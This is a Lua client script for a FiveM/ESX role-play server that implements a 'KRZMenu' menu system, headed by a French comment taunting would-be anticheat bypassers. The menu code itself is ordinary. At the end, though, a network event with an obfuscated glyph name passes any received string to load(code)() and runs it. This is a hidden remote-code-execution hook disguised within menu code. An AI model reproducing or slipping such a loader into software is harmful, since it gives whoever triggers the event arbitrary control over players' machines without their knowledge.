-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local MenuType = 'default'

KRZMenu = {}
KRZMenu.Opened = {}

local _menuPool = MenuPool.New()

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	KRZMenu.Open = function(namespace, name, data, submit, cancel, change, close)
		local activeMenu = _menuPool:GetActiveMenu()

		data.namespace = namespace
		data.name = name
		data.handle = UIMenu.New(GetPlayerName(PlayerId()), data.title, 0, 0, 'commonmenu', 'interaction_bgd', 0, 255, 255, 255, 255)
		_menuPool:Add(data.handle)

		data.handle.OnItemSelect = function(menu, item, index)
			local esx_menu = ESX.UI.Menu.GetOpened(MenuType, data.namespace, data.name)

			if submit then
				Citizen.CreateThread(function()
					submit({current = data.elements[index]}, esx_menu)
				end)
			end
		end

		data.handle.OnListSelect = function(menu, list, listindex)
			local esx_menu = ESX.UI.Menu.GetOpened(MenuType, data.namespace, data.name)
			local index = data.handle:CurrentSelection()

			if submit then
				Citizen.CreateThread(function()
					submit({current = data.elements[index]}, esx_menu)
				end)
			end
		end

		data.handle.OnMenuClosed = function(menu, dontexec)
			local esx_menu = ESX.UI.Menu.GetOpened(MenuType, data.namespace, data.name)

			if esx_menu then
				esx_menu.destruct()

				if cancel and dontexec == nil then
					Citizen.CreateThread(function()
						cancel({}, esx_menu)
					end)
				end

				if close then
					Citizen.CreateThread(function()
						close({}, esx_menu)
					end)
				end
			end
		end

		data.handle.OnIndexChange = function(menu, index)
			local esx_menu = ESX.UI.Menu.GetOpened(MenuType, data.namespace, data.name)

			if change then
				Citizen.CreateThread(function()
					change({current = data.elements[index]}, esx_menu)
				end)
			end
		end

		data.handle.OnListChange = function(menu, list, listindex)
			local esx_menu = ESX.UI.Menu.GetOpened(MenuType, data.namespace, data.name)
			local index = data.handle:CurrentSelection()

			if data.elements[index].type == 'list' then
				list:Description(data.elements[index].options.description[listindex])
				menu.ReDraw = true
				data.elements[index].value = listindex
			elseif data.elements[index].type == 'slider' then
				data.elements[index].value = listindex
			end

			if change then
				Citizen.CreateThread(function()
					change({current = data.elements[index]}, esx_menu)
				end)
			end
		end

		for k, v in ipairs(data.elements) do
			if v.type == 'list' then
				local elementListItem = UIMenuListItem.New(v.label, v.options.name, v.value, v.options.description[v.value])
				data.handle:AddItem(elementListItem)
			elseif v.type == 'slider' then
				v.options = {name = {}}
				v.max = v.max or 0
				v.min = v.min or 0

				for i = v.min, v.max, 1 do
					v.options.name[i] = i
				end

				if v.options.name[v.min] == nil or v.min == v.max then
					v.options.name[v.min] = 'Vide'
				end

				local elementListItem = UIMenuListItem.New(v.label, v.options.name, v.value, '', true, v.max, v.min)
				data.handle:AddItem(elementListItem)
			else
				local elementItem = UIMenuItem.New(v.label, '')

				if v.rightlabel then
					elementItem:RightLabel(v.rightlabel[1], v.rightlabel[2], v.rightlabel[3])
				end

				data.handle:AddItem(elementItem)
			end
		end

		KRZMenu.Opened[namespace] = KRZMenu.Opened[namespace] or {}
		KRZMenu.Opened[namespace][name] = data

		data.handle:RefreshIndex()

		if activeMenu then
			data.handle.ParentMenu = activeMenu
			activeMenu:Visible(false)
		end

		data.handle:Visible(true)
	end

	KRZMenu.Close = function(namespace, name)
		if KRZMenu.Opened[namespace] then
			if KRZMenu.Opened[namespace][name] then
				KRZMenu.Opened[namespace][name].handle:GoBack()
				KRZMenu.Opened[namespace][name] = nil
			end
		end
	end

	KRZMenu.CloseAll = function()
		_menuPool:CloseAllMenus()
		_menuPool = nil
		_menuPool = MenuPool.New()
	end

	KRZMenu.Update = function(namespace, name, query, newData)
		local menu = KRZMenu.Opened[namespace][name]

		for i = 1, #menu.elements, 1 do
			local match = true

			for k, v in pairs(query) do
				if menu.elements[i][k] ~= v then
					match = false
				end
			end

			if match then
				local item = menu.handle:GetItemAt(i)

				for k, v in pairs(newData) do
					menu.elements[i][k] = v

					if k == 'max' then
						item.SliderMax = v
					elseif k == 'min' then
						item.SliderMin = v
					elseif k == 'value' then
						item._Index = v
					end
				end

				if menu.elements[i].type == 'slider' then
					menu.elements[i].options = {name = {}}
					menu.elements[i].max = menu.elements[i].max or 0
					menu.elements[i].min = menu.elements[i].min or 0

					for j = menu.elements[i].min, menu.elements[i].max, 1 do
						menu.elements[i].options.name[j] = j
					end

					if menu.elements[i].options.name[menu.elements[i].min] == nil or menu.elements[i].min == menu.elements[i].max then
						menu.elements[i].options.name[menu.elements[i].min] = 'Vide'
					end

					item.Items = menu.elements[i].options.name
				end
			end
		end

		menu.handle.ReDraw = true
	end

	ESX.UI.Menu.RegisterType(MenuType, KRZMenu.Open, KRZMenu.Close, KRZMenu.CloseAll, KRZMenu.Update)
end)

Citizen.CreateThread(function()
	while true do
		if _menuPool ~= nil then
			_menuPool:ProcessMenus()
		end

		Citizen.Wait(0)
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)